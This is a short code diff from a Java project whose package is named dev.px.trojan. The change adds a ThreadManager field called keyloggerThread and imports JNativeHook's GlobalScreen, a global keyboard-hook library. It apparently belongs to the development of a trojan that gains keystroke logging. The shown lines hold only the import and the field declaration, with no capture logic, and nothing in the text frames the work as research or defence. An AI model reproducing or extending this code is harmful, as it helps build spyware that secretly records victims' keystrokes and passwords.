@@ -1,6 +1,7 @@
 package dev.px.trojan.Manager;
 
 import dev.px.trojan.Impl.Handler;
+import org.jnativehook.GlobalScreen;
 
 import java.util.concurrent.*;
 
@@ -8,6 +9,7 @@ public class ThreadManager {
 
     private ScheduledExecutorService mainThread;
     private Thread backgroundThread;
+    private Thread keyloggerThread;
 
     public ThreadManager() {
         this.mainThread = Executors.newScheduledThreadPool(1);
